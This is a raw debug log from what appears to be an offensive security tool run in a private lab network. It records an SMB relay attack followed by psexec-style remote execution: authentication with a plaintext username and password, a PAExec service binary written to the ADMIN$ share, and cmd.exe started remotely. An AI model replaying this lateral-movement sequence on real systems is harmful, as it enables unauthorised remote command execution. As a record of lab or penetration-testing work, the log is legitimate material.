2021-10-13 15:00:54.936 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:69 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
2021-10-14 10:06:25.221 | INFO     | pypsexec.scmr:open:469 - Sending bind request to svcctl
2021-10-14 10:06:25.224 | INFO     | smbprotocol.open:write:1376 - Session: apuia, Tree Connect: \\192.168.253.134\IPC$ - sending SMB2 Write Request for file svcctl
2021-10-14 10:06:25.229 | INFO     | smbprotocol.open:_write_response:1387 - Session: apuia, Tree Connect: \\192.168.253.134\IPC$ - receiving SMB2 Write Response
2021-10-14 10:06:25.233 | INFO     | pypsexec.scmr:open:473 - Receiving bind result for svcctl
2021-10-14 10:06:25.234 | INFO     | smbprotocol.open:read:1301 - Session: apuia, Tree Connect ID: \\192.168.253.134\IPC$ - sending SMB2 Read Request for file svcctl
2021-10-14 10:06:25.237 | INFO     | smbprotocol.open:_read_response:1312 - Session: apuia, Tree Connect ID: \\192.168.253.134\IPC$ - receiving SMB2 Read Response
2021-10-14 10:06:25.244 | INFO     | pypsexec.scmr:_invoke:713 - Sending svcctl RPC request for ROpenSCManagerW
2021-10-14 10:06:25.248 | INFO     | pypsexec.scmr:_invoke:718 - Receiving svcctl RPC response for ROpenSCManagerW
2021-10-14 10:07:02.782 | INFO     | project.smb.psexec:do_psexec:455 - Starting psexec with the user apuia and the password Password2 in 192.168.253.129
2021-10-14 10:07:02.783 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
2021-10-14 10:07:02.784 | INFO     | smbprotocol.connection:__init__:628 - Initialising connection, guid: 550e0454-46ad-4c20-94f3-737b1c184131, require_signing: True, server_name: 192.168.253.129, port: 445
2021-10-14 10:07:02.784 | INFO     | smbprotocol.session:__init__:216 - Initialising session with username: apuia
2021-10-14 10:07:02.785 | INFO     | pypsexec.client:__init__:90 - Creating PyPsexec Client with unique name: PAExec-11986-igris
2021-10-14 10:07:02.785 | INFO     | pypsexec.client:__init__:99 - Generated unique ID for PyPsexec Client: 6762171
2021-10-14 10:07:02.786 | INFO     | pypsexec.client:connect:104 - Setting up SMB Connection to 192.168.253.129:445
2021-10-14 10:07:02.786 | INFO     | smbprotocol.connection:connect:716 - Setting up transport connection
2021-10-14 10:07:02.787 | INFO     | smbprotocol.transport:connect:65 - Connecting to DirectTcp socket
2021-10-14 10:07:02.790 | INFO     | smbprotocol.connection:connect:724 - Starting negotiation with SMB server
2021-10-14 10:07:02.792 | INFO     | smbprotocol.connection:_send_smb2_negotiate:1303 - Negotiating with SMB2 protocol with highest client dialect of: SMB_3_1_1
2021-10-14 10:07:02.802 | INFO     | smbprotocol.connection:_send_smb2_negotiate:1356 - Sending SMB2 Negotiate message
2021-10-14 10:07:03.142 | INFO     | smbprotocol.connection:_send_smb2_negotiate:1361 - Receiving SMB2 Negotiate response
2021-10-14 10:07:03.152 | INFO     | smbprotocol.connection:connect:726 - Negotiated dialect: (785) SMB_3_1_1
2021-10-14 10:07:03.153 | INFO     | smbprotocol.connection:connect:739 - Connection require signing: True
2021-10-14 10:07:03.154 | INFO     | pypsexec.client:connect:107 - Authenticating SMB Session
2021-10-14 10:07:03.168 | INFO     | smbprotocol.session:connect:287 - Sending SMB2_SESSION_SETUP request message
2021-10-14 10:07:03.170 | INFO     | smbprotocol.session:connect:290 - Receiving SMB2_SESSION_SETUP response message
2021-10-14 10:07:03.174 | INFO     | smbprotocol.session:connect:313 - More processing is required for SMB2_SESSION_SETUP
2021-10-14 10:07:03.179 | INFO     | smbprotocol.session:connect:287 - Sending SMB2_SESSION_SETUP request message
2021-10-14 10:07:03.180 | INFO     | smbprotocol.session:connect:290 - Receiving SMB2_SESSION_SETUP response message
2021-10-14 10:07:03.192 | INFO     | smbprotocol.session:connect:317 - Setting session id to 351843720888321
2021-10-14 10:07:03.193 | INFO     | smbprotocol.session:connect:374 - Verifying the SMB Setup Session signature as auth is successful
2021-10-14 10:07:03.193 | INFO     | pypsexec.client:connect:109 - Opening handle to SCMR and PAExec service
2021-10-14 10:07:03.194 | INFO     | pypsexec.scmr:open:286 - Opening handle for SCMR on 192.168.253.129
2021-10-14 10:07:03.194 | INFO     | smbprotocol.tree:connect:231 - Session: apuia - Creating connection to share \\192.168.253.129\IPC$
2021-10-14 10:07:03.195 | INFO     | smbprotocol.tree:connect:237 - Session: apuia - Sending Tree Connect message
2021-10-14 10:07:03.196 | INFO     | smbprotocol.tree:connect:243 - Session: apuia - Receiving Tree Connect response
2021-10-14 10:07:03.198 | INFO     | smbprotocol.tree:connect:252 - Session: apuia - Created tree connection with ID 1
2021-10-14 10:07:03.199 | INFO     | smbprotocol.tree:_verify_dialect_negotiate:305 - Session: apuia, Tree: \\192.168.253.129\IPC$ - Running secure negotiate process
2021-10-14 10:07:03.199 | INFO     | smbprotocol.open:create:1205 - Session: apuia, Tree Connect: \\192.168.253.129\IPC$ - sending SMB2 Create Request for file svcctl
2021-10-14 10:07:03.200 | INFO     | smbprotocol.open:_create_response:1217 - Session: apuia, Tree Connect: \\192.168.253.129\IPC$ - receiving SMB2 Create Response
2021-10-14 10:07:03.217 | INFO     | pypsexec.scmr:open:469 - Sending bind request to svcctl
2021-10-14 10:07:03.222 | INFO     | smbprotocol.open:write:1376 - Session: apuia, Tree Connect: \\192.168.253.129\IPC$ - sending SMB2 Write Request for file svcctl
2021-10-14 10:07:03.225 | INFO     | smbprotocol.open:_write_response:1387 - Session: apuia, Tree Connect: \\192.168.253.129\IPC$ - receiving SMB2 Write Response
2021-10-14 10:07:03.228 | INFO     | pypsexec.scmr:open:473 - Receiving bind result for svcctl
2021-10-14 10:07:03.228 | INFO     | smbprotocol.open:read:1301 - Session: apuia, Tree Connect ID: \\192.168.253.129\IPC$ - sending SMB2 Read Request for file svcctl
2021-10-14 10:07:03.231 | INFO     | smbprotocol.open:_read_response:1312 - Session: apuia, Tree Connect ID: \\192.168.253.129\IPC$ - receiving SMB2 Read Response
2021-10-14 10:07:03.245 | INFO     | pypsexec.scmr:_invoke:713 - Sending svcctl RPC request for ROpenSCManagerW
2021-10-14 10:07:03.248 | INFO     | pypsexec.scmr:_invoke:718 - Receiving svcctl RPC response for ROpenSCManagerW
2021-10-14 10:07:03.282 | INFO     | project.smb.psexec:try_psexec_connection:262 - The connection has been established successfully
2021-10-14 10:07:03.286 | INFO     | pypsexec.scmr:_open_service:380 - Opening handle for Service PAExec-11986-igris
2021-10-14 10:07:03.286 | INFO     | pypsexec.scmr:_invoke:713 - Sending svcctl RPC request for ROpenServiceW
2021-10-14 10:07:03.293 | INFO     | pypsexec.scmr:_invoke:718 - Receiving svcctl RPC response for ROpenServiceW
2021-10-14 10:07:03.304 | INFO     | pypsexec.client:create_service:126 - Connecting to SMB Tree \\192.168.253.129\ADMIN$
2021-10-14 10:07:03.305 | INFO     | smbprotocol.tree:connect:231 - Session: apuia - Creating connection to share \\192.168.253.129\ADMIN$
2021-10-14 10:07:03.306 | INFO     | smbprotocol.tree:connect:237 - Session: apuia - Sending Tree Connect message
2021-10-14 10:07:03.310 | INFO     | smbprotocol.tree:connect:243 - Session: apuia - Receiving Tree Connect response
2021-10-14 10:07:03.314 | INFO     | smbprotocol.tree:connect:252 - Session: apuia - Created tree connection with ID 5
2021-10-14 10:07:03.315 | INFO     | smbprotocol.tree:_verify_dialect_negotiate:305 - Session: apuia, Tree: \\192.168.253.129\ADMIN$ - Running secure negotiate process
2021-10-14 10:07:03.316 | INFO     | smbprotocol.open:create:1205 - Session: apuia, Tree Connect: \\192.168.253.129\ADMIN$ - sending SMB2 Create Request for file PAExec-11986-igris.exe
2021-10-14 10:07:03.323 | INFO     | smbprotocol.open:_create_response:1217 - Session: apuia, Tree Connect: \\192.168.253.129\ADMIN$ - receiving SMB2 Create Response
2021-10-14 10:07:03.330 | INFO     | pypsexec.client:create_service:136 - Creating PAExec executable at \\192.168.253.129\ADMIN$\PAExec-11986-igris.exe
2021-10-14 10:07:03.332 | INFO     | smbprotocol.open:write:1376 - Session: apuia, Tree Connect: \\192.168.253.129\ADMIN$ - sending SMB2 Write Request for file PAExec-11986-igris.exe
2021-10-14 10:07:04.619 | INFO     | smbprotocol.open:_write_response:1387 - Session: apuia, Tree Connect: \\192.168.253.129\ADMIN$ - receiving SMB2 Write Response
2021-10-14 10:07:04.622 | INFO     | smbprotocol.open:close:1531 - Session: apuia, Tree Connect: \\192.168.253.129\ADMIN$ - sending SMB2 Close Request for file PAExec-11986-igris.exe
2021-10-14 10:07:04.623 | INFO     | smbprotocol.open:_close_response:1542 - Session: apuia, Tree Connect: \\192.168.253.129\ADMIN$ - receiving SMB2 Close Response
2021-10-14 10:07:05.130 | INFO     | pypsexec.client:create_service:142 - Disconnecting from SMB Tree \\192.168.253.129\ADMIN$
2021-10-14 10:07:05.130 | INFO     | smbprotocol.tree:disconnect:282 - Session: apuia, Tree: \\192.168.253.129\ADMIN$ - Disconnecting from Tree Connect
2021-10-14 10:07:05.131 | INFO     | smbprotocol.tree:disconnect:286 - Session: apuia, Tree: \\192.168.253.129\ADMIN$ - Sending Tree Disconnect message
2021-10-14 10:07:05.134 | INFO     | smbprotocol.tree:disconnect:293 - Session: apuia, Tree: \\192.168.253.129\ADMIN$ - Receiving Tree Disconnect response
2021-10-14 10:07:05.140 | INFO     | pypsexec.client:create_service:147 - Creating PAExec service PAExec-11986-igris
2021-10-14 10:07:05.140 | INFO     | pypsexec.scmr:_open_service:380 - Opening handle for Service PAExec-11986-igris
2021-10-14 10:07:05.141 | INFO     | pypsexec.scmr:_invoke:713 - Sending svcctl RPC request for ROpenServiceW
2021-10-14 10:07:05.143 | INFO     | pypsexec.scmr:_invoke:718 - Receiving svcctl RPC response for ROpenServiceW
2021-10-14 10:07:05.149 | INFO     | pypsexec.scmr:_invoke:713 - Sending svcctl RPC request for RCreateServiceW
2021-10-14 10:07:05.152 | INFO     | pypsexec.scmr:_invoke:718 - Receiving svcctl RPC response for RCreateServiceW
2021-10-14 10:07:05.192 | INFO     | project.smb.psexec:try_create_service_of_psexec:283 - The servide has been created successfully
2021-10-14 10:07:05.253 | INFO     | project.smb.psexec:shell:234 - Starting cmd.exe interactively
2021-10-14 10:07:08.340 | INFO     | pypsexec.scmr:_invoke:713 - Sending svcctl RPC request for RStartServiceW
2021-10-14 10:07:08.344 | INFO     | pypsexec.scmr:_invoke:718 - Receiving svcctl RPC response for RStartServiceW
2021-10-14 10:07:08.689 | INFO     | pypsexec.client:run_executable:320 - Connecting to SMB Tree \\192.168.253.129\IPC$
2021-10-14 10:07:08.690 | INFO     | smbprotocol.tree:connect:231 - Session: apuia - Creating connection to share \\192.168.253.129\IPC$
2021-10-14 10:07:08.691 | INFO     | smbprotocol.tree:connect:237 - Session: apuia - Sending Tree Connect message
2021-10-14 10:07:08.695 | INFO     | smbprotocol.tree:connect:243 - Session: apuia - Receiving Tree Connect response
2021-10-14 10:07:08.702 | INFO     | smbprotocol.tree:connect:252 - Session: apuia - Created tree connection with ID 9
2021-10-14 10:07:08.703 | INFO     | smbprotocol.tree:_verify_dialect_negotiate:305 - Session: apuia, Tree: \\192.168.253.129\IPC$ - Running secure negotiate process
2021-10-14 10:07:08.705 | INFO     | pypsexec.pipe:open_pipe:73 - Creating SMB Open for pipe: PAExec-11986-igris.exe
2021-10-14 10:07:08.707 | INFO     | smbprotocol.open:create:1205 - Session: apuia, Tree Connect: \\192.168.253.129\IPC$ - sending SMB2 Create Request for file PAExec-11986-igris.exe
2021-10-14 10:07:08.714 | INFO     | smbprotocol.open:_create_response:1217 - Session: apuia, Tree Connect: \\192.168.253.129\IPC$ - receiving SMB2 Create Response
2021-10-14 10:07:08.722 | INFO     | pypsexec.client:run_executable:371 - Writing PAExecSettingsMsg to the main PAExec pipe
2021-10-14 10:07:08.724 | INFO     | pypsexec.client:run_executable:372 - PAExecSettingsMsg:
    msg_id = (1) MSGID_SETTINGS
    xor_val = 3559686577
    unique_id = 6762171
    buffer_len = 0
    buffer =
    PAExecSettingsBuffer:
        version = 1
        num_processors = 0
        processors = []
        copy_files = False
        force_copy = False
        copy_if_newer_or_higher_ver = False
        asynchronous = False
        dont_load_profile = False
        interactive_session = 0
        interactive = False
        run_elevated = False
        run_limited = False
        password_len = 0
        password = 
        username_len = 0
        username = 
        use_system_account = False
        working_dir_len = 19
        working_dir = 43 00 3A 00 5C 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 5C 00 53 00 79 00 73 00 74 00 65 00 6D 00 33 00 32 00
        show_ui_on_win_logon = False
        priority = (32) NORMAL_PRIORITY_CLASS
        executable_len = 7
        executable = 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00
        arguments_len = 6
        arguments = 2F 00 63 00 20 00 64 00 69 00 72 00
        disable_file_redirection = True
        enable_debug = False
        remote_log_path_len = 0
        remote_log_path = 
        no_delete = False
        src_dir_len = 0
        src_dir = 
        dest_dir_len = 0
        dest_dir = 
        num_src_files = 0
        src_files = []
        num_dest_files = 0
        dest_files = []
        timeout_seconds = 0

        Raw Hex:
            01 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 13 00 00
            00 43 00 3A 00 5C 00 57
            00 69 00 6E 00 64 00 6F
            00 77 00 73 00 5C 00 53
            00 79 00 73 00 74 00 65
            00 6D 00 33 00 32 00 00
            20 00 00 00 07 00 00 00
            63 00 6D 00 64 00 2E 00
            65 00 78 00 65 00 06 00
            00 00 2F 00 63 00 20 00
            64 00 69 00 72 00 01 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00

    Raw Hex:
        01 00 B1 81 2C D4 0A 1B
        7D C3 C4 B9 BA BF B1 B5
        B6 AB AC A1 A2 A7 98 9D
        9E 93 94 89 8A 8F 80 85
        86 7B 7F 72 71 74 6B 6E
        6D 60 67 49 59 5C 53 15
        55 72 4F 1E 41 13 3B 57
        3D 5E 37 4E 29 43 23 51
        25 6B 1F 4E 11 47 0B 77
        0D 73 07 8E F9 99 F3 9B
        F5 DB EF D0 E1 E4 FB DE
        DD D0 D0 CA C9 CC A0 C6
        A8 B8 DB B2 9F B4 CE AE
        D5 A0 C2 9A 9F 9C 93 96
        BA 88 EC 82 A1 84 1F 7F
        15 71 04 6B 69 6D 62 67
        64 59 5E 53 50 55 4A 4F
        4C 41 46 3B 38 3D 32 37
        34 29 2E 23 7B F8 D4
2021-10-14 10:07:08.725 | INFO     | smbprotocol.open:write:1376 - Session: apuia, Tree Connect: \\192.168.253.129\IPC$ - sending SMB2 Write Request for file PAExec-11986-igris.exe
2021-10-14 10:07:08.729 | INFO     | smbprotocol.open:_write_response:1387 - Session: apuia, Tree Connect: \\192.168.253.129\IPC$ - receiving SMB2 Write Response
2021-10-14 10:07:08.734 | INFO     | pypsexec.client:run_executable:375 - Reading PAExecMsg from the PAExec pipe
2021-10-14 10:07:08.734 | INFO     | smbprotocol.open:read:1301 - Session: apuia, Tree Connect ID: \\192.168.253.129\IPC$ - sending SMB2 Read Request for file PAExec-11986-igris.exe
2021-10-14 10:07:08.736 | INFO     | smbprotocol.open:_read_response:1312 - Session: apuia, Tree Connect ID: \\192.168.253.129\IPC$ - receiving SMB2 Read Response
2021-10-14 10:07:08.741 | INFO     | pypsexec.client:run_executable:392 - Writing PAExecMsg with PAExecStartBuffer to start the remote process
2021-10-14 10:07:08.744 | INFO     | smbprotocol.open:write:1376 - Session: apuia, Tree Connect: \\192.168.253.129\IPC$ - sending SMB2 Write Request for file PAExec-11986-igris.exe
2021-10-14 10:07:08.749 | INFO     | smbprotocol.open:_write_response:1387 - Session: apuia, Tree Connect: \\192.168.253.129\IPC$ - receiving SMB2 Write Response
2021-10-14 10:07:08.754 | INFO     | pypsexec.client:run_executable:400 - Connecting to remote pipes to retrieve output
2021-10-14 10:07:08.756 | INFO     | pypsexec.pipe:__init__:185 - Initialising Output Named Pipe with the name: PaExecOutigris11986
2021-10-14 10:07:08.757 | INFO     | pypsexec.pipe:open_pipe:73 - Creating SMB Open for pipe: PaExecOutigris11986
2021-10-14 10:07:08.759 | INFO     | pypsexec.pipe:open_pipe:86 - Sending FSCTL_PIPE_WAIT for pipe PaExecOutigris11986
2021-10-14 10:07:08.765 | INFO     | pypsexec.pipe:open_pipe:94 - Receiving FSCTL_PIPE_WAIT response for pipe: PaExecOutigris11986
2021-10-14 10:07:08.768 | INFO     | smbprotocol.open:create:1205 - Session: apuia, Tree Connect: \\192.168.253.129\IPC$ - sending SMB2 Create Request for file PaExecOutigris11986
2021-10-14 10:07:08.772 | INFO     | smbprotocol.open:_create_response:1217 - Session: apuia, Tree Connect: \\192.168.253.129\IPC$ - receiving SMB2 Create Response
2021-10-14 10:07:08.781 | INFO     | pypsexec.pipe:__init__:185 - Initialising Output Named Pipe with the name: PaExecErrigris11986
2021-10-14 10:07:08.781 | INFO     | pypsexec.pipe:open_pipe:73 - Creating SMB Open for pipe: PaExecErrigris11986
2021-10-14 10:07:08.783 | INFO     | pypsexec.pipe:open_pipe:86 - Sending FSCTL_PIPE_WAIT for pipe PaExecErrigris11986
2021-10-14 10:07:08.785 | INFO     | smbprotocol.open:_read_response:1312 - Session: apuia, Tree Connect ID: \\192.168.253.129\IPC$ - receiving SMB2 Read Response
